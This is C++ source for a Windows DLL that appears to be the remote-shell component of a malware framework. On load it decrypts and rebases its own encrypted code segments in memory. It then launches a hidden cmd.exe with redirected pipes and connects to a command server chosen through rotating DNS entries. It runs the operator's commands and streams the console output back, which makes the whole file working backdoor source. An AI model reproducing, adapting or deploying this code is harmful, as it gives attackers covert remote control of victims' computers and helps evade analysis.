#include "../Core/ComponentUtilities.h"
#include "../Core/PELoader.h"
#include "../Core/TcpShortDef.h"
#include <fstream>
#include <shellapi.h>
#include <sstream>
#include <queue>
#include <memory>

//Components required defines
#define COMPONENT_TYPE ClientTypes::shell

#pragma section(segment_qdata, read)
store_variable(segment_qdata) QDATA_STORAGE storage { { 0 }, 1 };

HMODULE thisDll;
FILE_MUTEX_STRUCT thisLock;

int main();


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
	switch (fdwReason) {
		case DLL_PROCESS_ATTACH:
		{
			thisDll = hinstDLL;
			srand(time(NULL));
			break;
		}
		case DLL_PROCESS_DETACH:
		{
			break;
		}
		case DLL_THREAD_ATTACH:
		{
			break;
		}
		case DLL_THREAD_DETACH:
		{
			break;
		}
	}

	return true;
}

void CALLBACK debug(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
	// Although debug will be exported only in debug version add this checkpoint

#ifdef  _DEBUG
	main();
#endif
}

//Error code should be 1000
//This is the signature for thread function
unsigned int WINAPI coInitComponent(LPVOID lpParameter) {
	DBG("Intro ....Locking");
	thisLock = getComponentLock(thisDll);

	if (!thisLock.locked) {
		DBG("Intro ....FAILED");
		FreeLibraryAndExitThread(thisDll, 1000);
		return 1000;	//Keep just in case
	}

	DBG("Intro ....Decrypting module in memory");

	if (!revertRelocatorChanges(thisDll)) {
		FreeLibraryAndExitThread(thisDll, 1000);
		return 1000;	//Keep just in case
	}
	if (!decryptSegmentInMemory(thisDll, segment_crypt)) {
		FreeLibraryAndExitThread(thisDll, 1000);
		return 1000;	//Keep just in case
	}
	if (!rebaseModuleSegment(thisDll)) {
		FreeLibraryAndExitThread(thisDll, 1000);
		return 1000;	//Keep just in case
	}

	DBG("Intro ....main() called");
	main();

	return 1;	//doesn't matter anymore. Just the first errors are important(for the loader)
}

//Returns version from data segment
DWORD getVersion() {
	return storage.version;
}

//Returns the component type
DWORD getType() {
	return (DWORD)COMPONENT_TYPE;
}



//Encripted side
HANDLE STDIN_WR, STDIN_R, STDOUT_W, STDOUT_R;
SECURITY_ATTRIBUTES securityAttrib;
PROCESS_INFORMATION childProcInfo;
STARTUPINFO	startupInfo;
HANDLE job = NULL;
const int INTERVAL_BUFF_FILL = 100;
TOKEN_KEY infiniteTokenKey;
std::array<char, 65000> console_buffer;

bool isCmdOpen() {
	return job != NULL;
}
void terminateCommandProcess() {
	if (isCmdOpen()) {
		TerminateProcess(childProcInfo.hProcess, 0);
		CloseHandle(childProcInfo.hThread);
		CloseHandle(childProcInfo.hProcess);

		CloseHandle(STDIN_R);
		CloseHandle(STDIN_WR);
		CloseHandle(STDOUT_R);
		CloseHandle(STDOUT_W);
		CloseHandle(job);

		job = NULL;
	}
}
bool startCmdJob() {
	HANDLE ghJob = CreateJobObject(NULL, NULL); // GLOBAL
	if (ghJob == NULL) return false;

	JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli = { 0 };

	// Configure all child processes associated with the job to terminate when the last handle is closed
	jeli.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
	if (SetInformationJobObject(ghJob, JobObjectExtendedLimitInformation, &jeli, sizeof(jeli)) == 0) {
		CloseHandle(ghJob);
		return false;
	}

	memset(&startupInfo, 0, sizeof(startupInfo));
	memset(&childProcInfo, 0, sizeof(childProcInfo));
	memset(&securityAttrib, 0, sizeof(securityAttrib));

	securityAttrib.nLength = sizeof(SECURITY_ATTRIBUTES);
	securityAttrib.bInheritHandle = TRUE;
	securityAttrib.lpSecurityDescriptor = NULL;

	if (CreatePipe(&STDOUT_R, &STDOUT_W, &securityAttrib, 0) == 0) {
		CloseHandle(ghJob);
		return false;
	}
	if (CreatePipe(&STDIN_R, &STDIN_WR, &securityAttrib, 0) == 0) {
		CloseHandle(STDOUT_R);
		CloseHandle(STDOUT_W);
		CloseHandle(ghJob);
		return false;
	}

	startupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	startupInfo.wShowWindow = SW_HIDE;
	startupInfo.hStdInput = STDIN_R;
	startupInfo.hStdOutput = STDOUT_W;
	startupInfo.hStdError = STDOUT_W;

	if (CreateProcessA(NULL, (char*)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, (LPSTARTUPINFOA)&startupInfo, &childProcInfo) == 0) {
		CloseHandle(STDIN_R);
		CloseHandle(STDIN_WR);
		CloseHandle(STDOUT_R);
		CloseHandle(STDOUT_W);
		CloseHandle(ghJob);
		return false;
	}

	if (AssignProcessToJobObject(ghJob, childProcInfo.hProcess) == 0) {
		TerminateProcess(childProcInfo.hProcess, 0);
		CloseHandle(childProcInfo.hThread);
		CloseHandle(childProcInfo.hProcess);

		CloseHandle(STDIN_R);
		CloseHandle(STDIN_WR);
		CloseHandle(STDOUT_R);
		CloseHandle(STDOUT_W);
		CloseHandle(ghJob);
		return false;
	}

	job = ghJob;

	return true;
}
void checkCmdCondition() {
	DWORD lpExitCode = 0;

	if (!isCmdOpen()) {
		startCmdJob();
		return;
	}

	if (GetExitCodeProcess(childProcInfo.hProcess, &lpExitCode) == 0) {
		lpExitCode = 0;
	}

	if (lpExitCode != STILL_ACTIVE) {
		terminateCommandProcess();
		startCmdJob();
	}
}


store_code(segment_crypt) bool netloop(HorizonClient& client) {
	std::unique_ptr<PACKET_HEADER> header(new PACKET_HEADER);
	std::queue<PACKET_HEADER> packets;
	DWORD univ_read_written;
	DWORD available = 0;

	checkCmdCondition();

	if (!recvHeader(header.get())) return false;

	switch ((PacketDataTypes)header->data_type) {
		case PacketDataTypes::flags_cancel_operation: {
			//This will cause the reset of cmd and all packets to be lost
			terminateCommandProcess();
			if (!sendHeader(PacketDataTypes::flags_cancelled_operation, 0, "")) return false;

			return true;
		}
		case PacketDataTypes::shell_init: {
			// Store the received key to be used for all further commands and transactions
			client.getToken(infiniteTokenKey);

			break;
		}
		case PacketDataTypes::shell: {
			available = 0;
			bool refreshMode = false;

			if (!isCmdOpen()) {
				if (!sendError("Host not started"))
					return false;

				Sleep(1000);	// Retry to spawn the console after some time to avoid infinite loop
				return true;
			}

			// Set transaction token
			client.setToken(infiniteTokenKey);

			if (strlen(header->arguments) == 0) {
				// This is the first command used to read the first lines of the console
				refreshMode = true;
			}
			if (strlen(header->arguments) >= 2 && header->arguments[0] == 13) {
				PeekNamedPipe(STDOUT_R, NULL, NULL, NULL, &available, NULL);
				if (available != 0) {
					// We still have something to read
					refreshMode = true;
				}
			}
			if (!refreshMode) {
				// Use an empty argument as a refresh mechanism without terminating the console
				if (WriteFile(STDIN_WR, header->arguments, strlen(header->arguments), &univ_read_written, NULL) == 0) {
					break;
				}

				// Wait for the data to appear in the input buffer
				for (int i = 0; i < 10; i++) {
					PeekNamedPipe(STDOUT_R, NULL, NULL, NULL, &available, NULL);
					if (available >= strlen(header->arguments)) break;

					Sleep(INTERVAL_BUFF_FILL);
				}

				if (strlen(header->arguments) && _strnicmp(header->arguments, "cls", 3) == 0) {
					//Read back from the buffer our command to avoid reflections
					//To avoid a very improbable lock use univ_read_written instead of strlen 
					//	(in case the output buffer doesn't contain all the strlen characters)
					if (ReadFile(STDOUT_R, console_buffer.data(), univ_read_written, &univ_read_written, NULL) == 0) {
						break;
					}
				}
			}

			Sleep(INTERVAL_BUFF_FILL);

			available = 0;
			PeekNamedPipe(STDOUT_R, NULL, NULL, NULL, &available, NULL);

			while (available) {
				if (!sendHeader(PacketDataTypes::shell, available, ""))
					return false;

				ZeroMemory(console_buffer.data(), console_buffer.size());

				do {
					if (ReadFile(STDOUT_R, console_buffer.data(), min(console_buffer.size(), available), &univ_read_written, NULL) == 0) {
						break;
					}

					if (!sendData(console_buffer.data(), univ_read_written)) return false;

					available -= univ_read_written;
				} while (available);

				PACKET_HEADER inside_header;
				if (client.dataAvailable(0)) {
					if (!recvHeader(&inside_header)) return false;

					if ((PacketDataTypes)inside_header.data_type == PacketDataTypes::flags_cancel_operation) {
						terminateCommandProcess();
						if (!sendHeader(PacketDataTypes::flags_cancelled_operation, 0, "")) return false;
						return true;
					} else {
						std::ostringstream message;
						message << "Command ignored \"" << inside_header.arguments << "\"";

						if (!sendNotification(message.str())) return false;
					}

					// Set transaction token back to its original value
					// It was reset when recvHeader was called
					client.setToken(infiniteTokenKey);
				}

				Sleep(INTERVAL_BUFF_FILL);
				PeekNamedPipe(STDOUT_R, NULL, NULL, NULL, &available, NULL);
			}

			break;
		}
	}

	return true;
}


void callback_userdescriptorChanged(const USERDESCRIPTOR* new_user) {
	updateStoredDescriptor(new_user);
}

store_code(segment_crypt) int main() {
	while (true) {
		try {
			DBG("Connecting");

			std::unique_ptr<USERDESCRIPTOR> user = loadStoredDescriptor(getVersion(), COMPONENT_TYPE);
			HorizonClient client(getNextDNS(), user.get(), thisDll, callback_userdescriptorChanged);

			DBG("Connected");

			if (!client.authentificate(__LINE__)) {
				DBG("Could not authentificate");
				continue;
			}

			// Message pump
			while (true) {
				if (!netloop(client)) break;
			}
			client.closeClient();

			DBG("Connection ended");

		} catch (std::exception ex) {
			DBG("Exeption");
			DBG(ex.what());
			Sleep(1000);
		}

		terminateCommandProcess();
	}

	return 0;
}